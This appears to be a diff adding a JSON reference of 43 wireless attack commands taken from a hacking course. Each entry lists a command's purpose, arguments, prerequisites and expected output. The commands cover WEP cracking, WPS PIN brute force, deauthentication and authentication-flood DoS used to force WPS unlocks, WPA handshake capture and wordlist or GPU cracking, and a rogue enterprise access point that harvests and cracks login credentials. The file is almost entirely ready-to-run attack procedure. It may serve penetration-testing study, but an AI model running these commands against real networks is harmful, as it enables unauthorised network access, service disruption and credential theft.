@@ -1,0 +1,645 @@
+[
+  {
+    "id": "CMD-001",
+    "command": "airodump-ng <interface>",
+    "purpose": "Scan nearby wireless networks and list access points and connected clients passively.",
+    "arguments": {
+      "<interface>": "Wireless network interface in monitor mode (e.g., wlan0mon, mon0)"
+    },
+    "prerequisites": [
+      "Wireless card set to monitor mode"
+    ],
+    "expected_output": "Live tabular list of APs (BSSID, PWR, Beacons, Data, CH, MB, ENC, CIPHER, AUTH, ESSID) and connected clients.",
+    "source_lecture": "018 WEP Cracking - Basic Case [Lecture 18]"
+  },
+  {
+    "id": "CMD-002",
+    "command": "airodump-ng --bssid <BSSID> -c <CHANNEL> -w <OUTPUT_PREFIX> <INTERFACE>",
+    "purpose": "Capture packets specifically from a target BSSID and channel, writing packets to a cap file.",
+    "arguments": {
+      "--bssid <BSSID>": "MAC address of target access point",
+      "-c <CHANNEL>": "Channel number of target access point",
+      "-w <OUTPUT_PREFIX>": "Prefix for output capture files (.cap, .csv, .netxml)",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Wireless card in monitor mode",
+      "Target BSSID and channel identified"
+    ],
+    "expected_output": "Capture files written to disk (prefix-01.cap) and filtered live target stats.",
+    "source_lecture": "018 WEP Cracking - Basic Case [Lecture 18]"
+  },
+  {
+    "id": "CMD-003",
+    "command": "aircrack-ng <CAPTURE_FILE.cap>",
+    "purpose": "Perform statistical WEP key cracking using collected Initialization Vectors (IVs).",
+    "arguments": {
+      "<CAPTURE_FILE.cap>": "Path to airodump-ng packet capture file containing WEP IVs"
+    },
+    "prerequisites": [
+      "Packet capture file with sufficient WEP IVs (~20,000+ IVs)"
+    ],
+    "expected_output": "Recovered WEP key in ASCII and Hex format upon success.",
+    "source_lecture": "018 WEP Cracking - Basic Case [Lecture 18]"
+  },
+  {
+    "id": "CMD-004",
+    "command": "ifconfig <INTERFACE>",
+    "purpose": "Display wireless interface network settings and MAC address.",
+    "arguments": {
+      "<INTERFACE>": "Wireless adapter interface name (e.g., wlan0, mon0, wlan0mon)"
+    },
+    "prerequisites": [
+      "Network interface active"
+    ],
+    "expected_output": "Hardware MAC address, IP settings, RX/TX packet counts, and interface status.",
+    "source_lecture": "019 Associating With Target Network Using Fake Authentication Attack [Lecture 19]"
+  },
+  {
+    "id": "CMD-005",
+    "command": "aireplay-ng --fakeauth 0 -a <BSSID> -h <CLIENT_MAC> <INTERFACE>",
+    "purpose": "Perform fake authentication with target access point to associate attacker MAC address.",
+    "arguments": {
+      "--fakeauth 0": "Fake authentication attack type with 0 delay (single request)",
+      "-a <BSSID>": "MAC address of target access point",
+      "-h <CLIENT_MAC>": "Attacker wireless card MAC address",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Interface in monitor mode",
+      "Target BSSID known"
+    ],
+    "expected_output": "Authentication Request sent and successful Association acknowledgement.",
+    "source_lecture": "019 Associating With Target Network Using Fake Authentication Attack [Lecture 19]"
+  },
+  {
+    "id": "CMD-006",
+    "command": "aireplay-ng --arpreplay -b <BSSID> -h <CLIENT_MAC> <INTERFACE>",
+    "purpose": "Listen for ARP request packets and re-inject them to rapidly generate WEP IVs.",
+    "arguments": {
+      "--arpreplay / -3": "ARP request replay packet injection mode",
+      "-b <BSSID>": "Target access point BSSID",
+      "-h <CLIENT_MAC>": "Associated MAC address (attacker MAC or connected client MAC)",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Fake authentication or connected client MAC on target network"
+    ],
+    "expected_output": "Captured ARP packet count and injected packet transmission rate.",
+    "source_lecture": "020 ARP Request Reply Attack [Lecture 20]"
+  },
+  {
+    "id": "CMD-007",
+    "command": "aireplay-ng --chopchop -b <BSSID> -h <CLIENT_MAC> <INTERFACE>",
+    "purpose": "Decrypt a WEP packet byte-by-byte to determine keystream (PRGA) without key.",
+    "arguments": {
+      "--chopchop / -4": "KoreK chopchop attack mode",
+      "-b <BSSID>": "Target access point BSSID",
+      "-h <CLIENT_MAC>": "Associated MAC address",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Associated with target AP",
+      "Captured packet from target network"
+    ],
+    "expected_output": "Decrypted packet stream and generated .xor keystream file.",
+    "source_lecture": "021 Chopchop Attack [Lecture 21]"
+  },
+  {
+    "id": "CMD-008",
+    "command": "packetforge-ng -0 -a <BSSID> -h <CLIENT_MAC> -k <DEST_IP> -l <SRC_IP> -y <PRGA_FILE.xor> -w <OUTPUT_PACKET>",
+    "purpose": "Create a custom ARP request packet using a harvested PRGA (.xor) keystream file.",
+    "arguments": {
+      "-0": "Generate ARP request packet",
+      "-a <BSSID>": "Target access point BSSID",
+      "-h <CLIENT_MAC>": "Source MAC address",
+      "-k <DEST_IP>": "Destination IP address (e.g. 255.255.255.255)",
+      "-l <SRC_IP>": "Source IP address (e.g. 255.255.255.255)",
+      "-y <PRGA_FILE.xor>": "PRGA keystream file from chopchop or fragmentation attack",
+      "-w <OUTPUT_PACKET>": "Output filename for forged packet"
+    },
+    "prerequisites": [
+      "Valid .xor keystream file generated from chopchop or fragmentation attack"
+    ],
+    "expected_output": "Wrote packet to specified output file.",
+    "source_lecture": "021 Chopchop Attack [Lecture 21]"
+  },
+  {
+    "id": "CMD-009",
+    "command": "aireplay-ng -2 -r <FORGED_PACKET> <INTERFACE>",
+    "purpose": "Replay/inject a custom forged packet file into wireless traffic.",
+    "arguments": {
+      "-2": "Interactive packet replay mode",
+      "-r <FORGED_PACKET>": "Path to forged packet file created by packetforge-ng",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Forged packet file created by packetforge-ng"
+    ],
+    "expected_output": "Prompt to confirm packet injection and high-rate packet injection stats.",
+    "source_lecture": "021 Chopchop Attack [Lecture 21]"
+  },
+  {
+    "id": "CMD-010",
+    "command": "aireplay-ng --fragment -b <BSSID> -h <CLIENT_MAC> <INTERFACE>",
+    "purpose": "Obtain 1500 bytes of PRGA keystream by fragmenting encrypted data frames.",
+    "arguments": {
+      "--fragment / -5": "Fragmentation attack mode",
+      "-b <BSSID>": "Target access point BSSID",
+      "-h <CLIENT_MAC>": "Associated MAC address",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Associated with target AP",
+      "Proximity to AP for signal reliability"
+    ],
+    "expected_output": "Generated 1500-byte PRGA keystream saved as .xor file.",
+    "source_lecture": "022 Fragmentation Attack [Lecture 22]"
+  },
+  {
+    "id": "CMD-011",
+    "command": "aireplay-ng --arpreplay -b <BSSID> -h <CONNECTED_CLIENT_MAC> <INTERFACE>",
+    "purpose": "Perform ARP replay attack against Shared Key Authentication (SKA) network using an existing client MAC.",
+    "arguments": {
+      "--arpreplay": "ARP replay mode",
+      "-b <BSSID>": "Target access point BSSID",
+      "-h <CONNECTED_CLIENT_MAC>": "MAC address of an already connected valid client",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "At least one active client connected to target SKA network"
+    ],
+    "expected_output": "Packet injection on behalf of connected client causing rapid IV count increase.",
+    "source_lecture": "023 Cracking SKA Networks [Lecture 23]"
+  },
+  {
+    "id": "CMD-012",
+    "command": "wash -i <INTERFACE>",
+    "purpose": "Scan for WPS-enabled access points and detect whether WPS lock is enabled.",
+    "arguments": {
+      "-i <INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Interface set to monitor mode"
+    ],
+    "expected_output": "Table listing BSSID, Channel, RSSI, WPS Version, WPS Locked status (No/Yes), ESSID.",
+    "source_lecture": "025 WPA Cracking - Exploiting WPS Feature [Lecture 25]"
+  },
+  {
+    "id": "CMD-013",
+    "command": "reaver -b <BSSID> -c <CHANNEL> -i <INTERFACE>",
+    "purpose": "Brute-force 8-digit WPS PIN on target access point to recover WPA/WPA2 passphrase.",
+    "arguments": {
+      "-b <BSSID>": "Target access point BSSID",
+      "-c <CHANNEL>": "Channel number of target access point",
+      "-i <INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "WPS enabled on target AP",
+      "WPS not locked"
+    ],
+    "expected_output": "WPS PIN progress percentage, recovered WPS PIN, and WPA PSK passphrase.",
+    "source_lecture": "025 WPA Cracking - Exploiting WPS Feature [Lecture 25]"
+  },
+  {
+    "id": "CMD-014",
+    "command": "aireplay-ng --fakeauth 100 -a <BSSID> -h <CLIENT_MAC> <INTERFACE>",
+    "purpose": "Maintain continuous fake association with 100-second delay to bypass Reaver association failures.",
+    "arguments": {
+      "--fakeauth 100": "Fake auth attack mode with 100-second re-association delay",
+      "-a <BSSID>": "Target access point BSSID",
+      "-h <CLIENT_MAC>": "Attacker wireless card MAC address",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Reaver association failure bug observed on target router"
+    ],
+    "expected_output": "Periodic successful association and re-association messages.",
+    "source_lecture": "026 Bypassing Failed to associate Issue [Lecture 26]"
+  },
+  {
+    "id": "CMD-015",
+    "command": "reaver -b <BSSID> -c <CHANNEL> -i <INTERFACE> -A",
+    "purpose": "Run Reaver without sending association requests, relying on external association.",
+    "arguments": {
+      "-b <BSSID>": "Target AP BSSID",
+      "-c <CHANNEL>": "Target AP Channel",
+      "-i <INTERFACE>": "Wireless interface in monitor mode",
+      "-A": "Do not associate with AP (rely on aireplay-ng fakeauth)"
+    },
+    "prerequisites": [
+      "aireplay-ng fakeauth running in separate terminal"
+    ],
+    "expected_output": "WPS PIN testing progress without association timeouts.",
+    "source_lecture": "026 Bypassing Failed to associate Issue [Lecture 26]"
+  },
+  {
+    "id": "CMD-016",
+    "command": "reaver -b <BSSID> -c <CHANNEL> -i <INTERFACE> -A -vv",
+    "purpose": "Run Reaver with high verbosity to inspect transaction details and packet exchanges.",
+    "arguments": {
+      "-vv": "Very verbose debugging output"
+    },
+    "prerequisites": [
+      "Reaver command stuck at 0.00% without error indication"
+    ],
+    "expected_output": "Detailed WSC_NACK, timeout, and transaction packet logs.",
+    "source_lecture": "027 Bypassing 0x3 0x4 Errors [Lecture 27]"
+  },
+  {
+    "id": "CMD-017",
+    "command": "reaver -b <BSSID> -c <CHANNEL> -i <INTERFACE> -A --no-nacks",
+    "purpose": "Ignore WSC NACK packets to prevent Reaver from repeating the same PIN in infinite loops.",
+    "arguments": {
+      "--no-nacks": "Do not send NACK messages when receiving out-of-order packets"
+    },
+    "prerequisites": [
+      "Reaver loop caused by router sending WSC NACK packets"
+    ],
+    "expected_output": "Reaver advancing through sequential PIN attempts without looping.",
+    "source_lecture": "027 Bypassing 0x3 0x4 Errors [Lecture 27]"
+  },
+  {
+    "id": "CMD-018",
+    "command": "aireplay-ng --deauth <COUNT> -a <BSSID> <INTERFACE>",
+    "purpose": "Broadcast deauthentication frames to force target router users to reboot hardware to unlock WPS.",
+    "arguments": {
+      "--deauth <COUNT>": "Number of deauthentication bursts to send (e.g. 100000)",
+      "-a <BSSID>": "Target access point BSSID",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "WPS lock detected on target router"
+    ],
+    "expected_output": "Deauth broadcast frames sent to all clients on AP.",
+    "source_lecture": "028 WPS Lock - What Is It How To Bypass it [Lecture 28]"
+  },
+  {
+    "id": "CMD-019",
+    "command": "mdk3 <INTERFACE> a -a <BSSID> -m",
+    "purpose": "Launch authentication DoS flood with valid MAC addresses to trigger target router WPS unlock reset.",
+    "arguments": {
+      "a": "Authentication DoS mode",
+      "-a <BSSID>": "Target access point BSSID",
+      "-m": "Use valid MAC addresses from database instead of random MACs"
+    },
+    "prerequisites": [
+      "WPS lock on target router",
+      "mdk3 tool installed"
+    ],
+    "expected_output": "Authentication flood transmission stats (e.g., 5000-10000 fake client attempts).",
+    "source_lecture": "029 Unlocking WPS [Lecture 29]"
+  },
+  {
+    "id": "CMD-020",
+    "command": "airodump-ng --bssid <BSSID> -c <CHANNEL> -w <OUTPUT_PREFIX> <INTERFACE>",
+    "purpose": "Listen for WPA/WPA2 4-way handshake exchange during client authentication.",
+    "arguments": {
+      "--bssid <BSSID>": "Target AP BSSID",
+      "-c <CHANNEL>": "Target AP Channel",
+      "-w <OUTPUT_PREFIX>": "Capture output file prefix",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "Target AP in range",
+      "Active client or reconnection event expected"
+    ],
+    "expected_output": "Top right banner displaying: [ WPA handshake: <BSSID> ].",
+    "source_lecture": "031 How To Capture The Handshake [Lecture 31]"
+  },
+  {
+    "id": "CMD-021",
+    "command": "aireplay-ng --deauth <COUNT> -a <BSSID> -c <CLIENT_MAC> <INTERFACE>",
+    "purpose": "Send targeted deauthentication frames to force client to reconnect and transmit 4-way handshake.",
+    "arguments": {
+      "--deauth <COUNT>": "Small count of deauth packets (e.g. 4)",
+      "-a <BSSID>": "Target AP MAC address",
+      "-c <CLIENT_MAC>": "Target client MAC address",
+      "<INTERFACE>": "Wireless interface in monitor mode"
+    },
+    "prerequisites": [
+      "airodump-ng capturing on target channel",
+      "Target client connected"
+    ],
+    "expected_output": "Deauth packets sent, triggering immediate client reconnection.",
+    "source_lecture": "031 How To Capture The Handshake [Lecture 31]"
+  },
+  {
+    "id": "CMD-022",
+    "command": "crunch <MIN> <MAX> <CHARSET> -t <PATTERN> -o <OUTPUT_FILE>",
+    "purpose": "Generate wordlist containing character permutations matching length and pattern criteria.",
+    "arguments": {
+      "<MIN>": "Minimum password length",
+      "<MAX>": "Maximum password length",
+      "<CHARSET>": "Character set string (e.g., 1234567890abcdef)",
+      "-t <PATTERN>": "Pattern layout (@ for wildcard, literal characters for fixed positions)",
+      "-o <OUTPUT_FILE>": "Output path for wordlist file"
+    },
+    "prerequisites": [
+      "crunch utility installed"
+    ],
+    "expected_output": "Total line count and file creation summary.",
+    "source_lecture": "032 Creating a Wordlist [Lecture 32]"
+  },
+  {
+    "id": "CMD-023",
+    "command": "cat <WORDLIST_FILE>",
+    "purpose": "Display generated wordlist file contents to stdout.",
+    "arguments": {
+      "<WORDLIST_FILE>": "Path to wordlist text file"
+    },
+    "prerequisites": [
+      "Wordlist file exists"
+    ],
+    "expected_output": "List of password strings.",
+    "source_lecture": "032 Creating a Wordlist [Lecture 32]"
+  },
+  {
+    "id": "CMD-024",
+    "command": "aircrack-ng <HANDSHAKE_CAP> -w <WORDLIST_FILE>",
+    "purpose": "Perform dictionary wordlist attack against captured WPA/WPA2 4-way handshake.",
+    "arguments": {
+      "<HANDSHAKE_CAP>": "Capture file containing 4-way handshake (.cap)",
+      "-w <WORDLIST_FILE>": "Path to dictionary wordlist file"
+    },
+    "prerequisites": [
+      "Valid 4-way handshake captured in .cap file",
+      "Wordlist file available"
+    ],
+    "expected_output": "KEY FOUND! [ <Passphrase> ] upon match, or KEY NOT FOUND after exhaust.",
+    "source_lecture": "033 Cracking Key Using A Wordlist Attack [Lecture 33]"
+  },
+  {
+    "id": "CMD-025",
+    "command": "john --wordlist=<WORDLIST_FILE> --stdout --session=<SESSION_NAME>",
+    "purpose": "Stream wordlist to stdout while saving position in session file for pause/resume capability.",
+    "arguments": {
+      "--wordlist=<WORDLIST_FILE>": "Path to wordlist file",
+      "--stdout": "Output passwords to standard output stream",
+      "--session=<SESSION_NAME>": "Session identifier for progress tracking"
+    },
+    "prerequisites": [
+      "John the Ripper installed",
+      "Wordlist file available"
+    ],
+    "expected_output": "Stream of passwords printed to stdout.",
+    "source_lecture": "034 Saving Cracking Progress [Lecture 34]"
+  },
+  {
+    "id": "CMD-026",
+    "command": "john --wordlist=<WORDLIST_FILE> --stdout --session=<SESSION_NAME> | aircrack-ng -b <BSSID> -w - <HANDSHAKE_CAP>",
+    "purpose": "Pipe wordlist from John the Ripper to aircrack-ng with session saving enabled.",
+    "arguments": {
+      "-b <BSSID>": "Target access point BSSID",
+      "-w -": "Read wordlist from standard input (stdin)",
+      "<HANDSHAKE_CAP>": "Capture file containing WPA handshake"
+    },
+    "prerequisites": [
+      "Captured WPA handshake",
+      "Wordlist file"
+    ],
+    "expected_output": "aircrack-ng cracking session with John the Ripper tracking position.",
+    "source_lecture": "034 Saving Cracking Progress [Lecture 34]"
+  },
+  {
+    "id": "CMD-027",
+    "command": "john --restore=<SESSION_NAME> | aircrack-ng -b <BSSID> -w - <HANDSHAKE_CAP>",
+    "purpose": "Restore paused cracking session from saved John the Ripper session file.",
+    "arguments": {
+      "--restore=<SESSION_NAME>": "Name of saved John session to resume",
+      "-w -": "Read wordlist from stdin"
+    },
+    "prerequisites": [
+      "Saved John session file (.rec file in working directory)"
+    ],
+    "expected_output": "Cracking resumed from exact saved percentage.",
+    "source_lecture": "034 Saving Cracking Progress [Lecture 34]"
+  },
+  {
+    "id": "CMD-028",
+    "command": "crunch <MIN> <MAX> [CHARSET] | aircrack-ng -b <BSSID> -w - <HANDSHAKE_CAP>",
+    "purpose": "Generate wordlist on-the-fly with crunch and pipe directly to aircrack-ng without disk storage.",
+    "arguments": {
+      "<MIN>": "Minimum password length (e.g. 8)",
+      "<MAX>": "Maximum password length (e.g. 8)",
+      "[CHARSET]": "Optional character set string",
+      "-w -": "Read password stream from stdin"
+    },
+    "prerequisites": [
+      "crunch and aircrack-ng installed"
+    ],
+    "expected_output": "Live cracking execution without saving multi-gigabyte files to disk.",
+    "source_lecture": "035 Using Huge Wordlists With Aircrack-ng Without Wasting Storage [Lecture 35]"
+  },
+  {
+    "id": "CMD-029",
+    "command": "crunch <MIN> <MAX> [CHARSET] | john --stdin --session=<SESSION_NAME> --stdout | aircrack-ng -b <BSSID> -w - <HANDSHAKE_CAP>",
+    "purpose": "Combine crunch generation, John session tracking, and aircrack-ng cracking in unified pipeline.",
+    "arguments": {
+      "--stdin": "Read wordlist stream from crunch stdin",
+      "--session=<SESSION_NAME>": "Save session tracking state",
+      "--stdout": "Output stream to stdout for aircrack-ng"
+    },
+    "prerequisites": [
+      "crunch, john, and aircrack-ng installed"
+    ],
+    "expected_output": "Diskless cracking pipeline with full pause/resume support.",
+    "source_lecture": "036 Saving Cracking Progress When Using Huge Wordlists Without Wasting Storage [Lecture 36]"
+  },
+  {
+    "id": "CMD-030",
+    "command": "airolib-ng <DB_NAME> --import passwd <WORDLIST_FILE>",
+    "purpose": "Import dictionary wordlist into airolib-ng SQLite PMK database.",
+    "arguments": {
+      "<DB_NAME>": "Path/name of SQLite database file",
+      "--import passwd <WORDLIST_FILE>": "Import password text file"
+    },
+    "prerequisites": [
+      "airolib-ng installed",
+      "Wordlist file available"
+    ],
+    "expected_output": "Database creation and imported password count.",
+    "source_lecture": "037 Speeding the Cracking Process Using Rainbow Tables [Lecture 37]"
+  },
+  {
+    "id": "CMD-031",
+    "command": "echo <ESSID> > <ESSID_FILE>",
+    "purpose": "Write target network ESSID string into text file.",
+    "arguments": {
+      "<ESSID>": "Exact ESSID network name string",
+      "<ESSID_FILE>": "Target text file path"
+    },
+    "prerequisites": [
+      "Write access to filesystem"
+    ],
+    "expected_output": "Text file containing target ESSID.",
+    "source_lecture": "037 Speeding the Cracking Process Using Rainbow Tables [Lecture 37]"
+  },
+  {
+    "id": "CMD-032",
+    "command": "cat <ESSID_FILE>",
+    "purpose": "Confirm ESSID text file content.",
+    "arguments": {
+      "<ESSID_FILE>": "Path to ESSID file"
+    },
+    "prerequisites": [
+      "ESSID text file created"
+    ],
+    "expected_output": "Printed ESSID string.",
+    "source_lecture": "037 Speeding the Cracking Process Using Rainbow Tables [Lecture 37]"
+  },
+  {
+    "id": "CMD-033",
+    "command": "airolib-ng <DB_NAME> --import essid <ESSID_FILE>",
+    "purpose": "Import target ESSID file into airolib-ng database.",
+    "arguments": {
+      "<DB_NAME>": "SQLite database file",
+      "--import essid <ESSID_FILE>": "Import ESSID file"
+    },
+    "prerequisites": [
+      "airolib-ng database created",
+      "ESSID text file available"
+    ],
+    "expected_output": "ESSID imported successfully into database.",
+    "source_lecture": "037 Speeding the Cracking Process Using Rainbow Tables [Lecture 37]"
+  },
+  {
+    "id": "CMD-034",
+    "command": "airolib-ng <DB_NAME> --batch",
+    "purpose": "Precompute Pairwise Master Keys (PMKs) using PBKDF2 for all imported password/ESSID pairs.",
+    "arguments": {
+      "--batch": "Process and compute PMK hashes for database entries"
+    },
+    "prerequisites": [
+      "Passwords and ESSID imported into airolib-ng database"
+    ],
+    "expected_output": "Computation time stats and generated PMK count.",
+    "source_lecture": "037 Speeding the Cracking Process Using Rainbow Tables [Lecture 37]"
+  },
+  {
+    "id": "CMD-035",
+    "command": "aircrack-ng -r <DB_NAME> <HANDSHAKE_CAP>",
+    "purpose": "Instantaneously crack WPA/WPA2 handshake using precomputed PMK database.",
+    "arguments": {
+      "-r <DB_NAME>": "Path to precomputed airolib-ng PMK database file",
+      "<HANDSHAKE_CAP>": "Capture file containing WPA handshake"
+    },
+    "prerequisites": [
+      "Batch precomputed PMK database matching target ESSID"
+    ],
+    "expected_output": "Instant KEY FOUND! output (< 1 second execution time).",
+    "source_lecture": "037 Speeding the Cracking Process Using Rainbow Tables [Lecture 37]"
+  },
+  {
+    "id": "CMD-036",
+    "command": "hashcat64.exe -I",
+    "purpose": "List hardware devices (GPUs/CPUs) available for hashcat acceleration.",
+    "arguments": {
+      "-I / -I": "Display device information"
+    },
+    "prerequisites": [
+      "GPU drivers installed",
+      "hashcat binary extracted"
+    ],
+    "expected_output": "Device ID, device name, type (GPU/CPU), and memory capacity.",
+    "source_lecture": "039 Cracking WPAWPA2 Much Faster Using GPU - Part 2 [Lecture 39]"
+  },
+  {
+    "id": "CMD-037",
+    "command": "hashcat64.exe -m 2500 -d 1 <HCCAPX_FILE> <WORDLIST_FILE>",
+    "purpose": "Perform GPU-accelerated WPA/WPA2 WPA-PSK key cracking using hccapx capture file.",
+    "arguments": {
+      "-m 2500": "WPA/WPA2 hash type identifier",
+      "-d 1": "Select Device ID 1 (GPU)",
+      "<HCCAPX_FILE>": "Converted handshake in .hccapx format",
+      "<WORDLIST_FILE>": "Path to dictionary wordlist"
+    },
+    "prerequisites": [
+      "Handshake converted to .hccapx format",
+      "GPU drivers installed"
+    ],
+    "expected_output": "High-speed candidate testing rate (e.g. 14 million keys/min) and recovered password.",
+    "source_lecture": "039 Cracking WPAWPA2 Much Faster Using GPU - Part 2 [Lecture 39]"
+  },
+  {
+    "id": "CMD-038",
+    "command": "apt-get update",
+    "purpose": "Update local APT package index repositories.",
+    "arguments": {},
+    "prerequisites": [
+      "Root/sudo privileges",
+      "Internet access"
+    ],
+    "expected_output": "Updated package list repository headers.",
+    "source_lecture": "042 Stealing Login Credentials [Lecture 42]"
+  },
+  {
+    "id": "CMD-039",
+    "command": "apt-get install hostapd-wpe",
+    "purpose": "Install hostapd-wpe package for enterprise rogue AP deployment.",
+    "arguments": {
+      "hostapd-wpe": "Package name for Wireless PEAP/TTLS credential harvesting daemon"
+    },
+    "prerequisites": [
+      "Updated APT package index"
+    ],
+    "expected_output": "Package installation completion confirmation.",
+    "source_lecture": "042 Stealing Login Credentials [Lecture 42]"
+  },
+  {
+    "id": "CMD-040",
+    "command": "leafpad /etc/hostapd-wpe/hostapd-wpe.conf",
+    "purpose": "Open and edit rogue WPA Enterprise access point configuration file in GUI text editor.",
+    "arguments": {
+      "/etc/hostapd-wpe/hostapd-wpe.conf": "Configuration path for interface, ssid, channel, and EAP parameters"
+    },
+    "prerequisites": [
+      "hostapd-wpe installed"
+    ],
+    "expected_output": "GUI text editor window with config file contents.",
+    "source_lecture": "042 Stealing Login Credentials [Lecture 42]"
+  },
+  {
+    "id": "CMD-041",
+    "command": "service network-manager stop",
+    "purpose": "Stop NetworkManager service to prevent interface conflicts during rogue AP creation.",
+    "arguments": {
+      "network-manager": "Network service daemon name",
+      "stop": "Stop action command"
+    },
+    "prerequisites": [
+      "Root/sudo privileges"
+    ],
+    "expected_output": "Service stopped status.",
+    "source_lecture": "042 Stealing Login Credentials [Lecture 42]"
+  },
+  {
+    "id": "CMD-042",
+    "command": "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf",
+    "purpose": "Launch rogue WPA Enterprise access point with built-in FreeRADIUS auth server to capture MS-CHAPv2 challenges.",
+    "arguments": {
+      "/etc/hostapd-wpe/hostapd-wpe.conf": "Path to hostapd-wpe config file"
+    },
+    "prerequisites": [
+      "NetworkManager stopped",
+      "Interface available"
+    ],
+    "expected_output": "Rogue AP initialization logs, client association events, username, challenge, and response strings.",
+    "source_lecture": "042 Stealing Login Credentials [Lecture 42]"
+  },
+  {
+    "id": "CMD-043",
+    "command": "asleap -C <CHALLENGE> -R <RESPONSE> -W <WORDLIST_FILE>",
+    "purpose": "Crack MS-CHAPv2 / NetNTLMv1 challenge-response hashes captured from rogue WPA Enterprise AP.",
+    "arguments": {
+      "-C <CHALLENGE>": "Captured 8-byte hex challenge string from hostapd-wpe",
+      "-R <RESPONSE>": "Captured 24-byte hex response string from hostapd-wpe",
+      "-W <WORDLIST_FILE>": "Path to dictionary wordlist file"
+    },
+    "prerequisites": [
+      "Captured MS-CHAPv2 challenge and response hex strings from hostapd-wpe"
+    ],
+    "expected_output": "Recovered MS-CHAPv2 plaintext password string upon dictionary match.",
+    "source_lecture": "043 Cracking Login Credentials [Lecture 43]"
+  }
+]
